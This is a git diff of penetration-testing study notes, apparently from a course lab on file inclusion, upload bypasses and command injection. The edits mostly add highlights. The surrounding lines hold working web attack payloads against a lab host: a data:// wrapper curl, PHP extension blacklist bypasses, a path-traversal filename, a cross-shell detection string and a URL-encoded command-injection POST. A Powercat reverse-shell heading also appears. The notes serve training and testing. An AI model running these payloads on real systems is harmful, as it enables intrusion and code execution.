@@ -550,7 +550,7 @@ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64
 
 ## 9.2.3 Remote File Inclusion (RFI)
 
-RFI includes a file from a **remote** location (for example over HTTP or SMB) and executes it in the web application’s context. It is less common because PHP generally requires `allow_url_include` to be enabled.
+RFI includes a file from a **remote** location (for example over HTTP or SMB) and executes it in the web application’s context. I==t is less common because PHP generally requires `allow_url_include` to be enabled.==
 
 ### Kali webshell used in the chapter
 
@@ -641,10 +641,10 @@ The text file uploads successfully, so validation is weak.
 
 ### Bypass extension blacklist
 
-Uploading `simple-backdoor.php` is blocked because `.php` is blacklisted. The chapter suggests two common bypass families:
+==Uploading `simple-backdoor.php` is blocked because `.php` is blacklisted. The chapter suggests two common bypass families:==
 
-- Alternative PHP extensions such as `.phps` or `.php7`.
-- Case variation, e.g. `.pHP`, if the blacklist comparison is case-sensitive.
+- ==Alternative PHP extensions such as `.phps` or `.php7`.==
+- ==Case variation, e.g. `.pHP`, if the blacklist comparison is case-sensitive.==
 
 The example renames the webshell to:
 
@@ -765,6 +765,7 @@ Upload `test.txt`, intercept/replay the multipart POST in Burp, and change the m
 ../../../../../../../test.txt
 ```
 
+==Changing the filename to ../test.txt is not possible locally, it should be done in burp or curl command while uploading!==
 This tests whether the backend trusts the client-supplied filename and joins it directly to an upload path.
 
 > [!warning] Real assessments
@@ -909,7 +910,7 @@ Exact behavior depends on whether the backend invokes CMD, PowerShell, Bash, `sh
 
 ### Identify the command interpreter
 
-The chapter uses this cross-shell detection snippet:
+==The chapter uses this cross-shell detection snippet:==
 
 ```text
 (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
@@ -923,7 +924,7 @@ curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C
 
 The response prints `PowerShell`, so injected commands are being interpreted by PowerShell.
 
-### Powercat reverse shell
+### Powercat reverse shell (windows)
 
 Powercat is a PowerShell implementation of Netcat included with Kali. Copy it to the current directory:
 
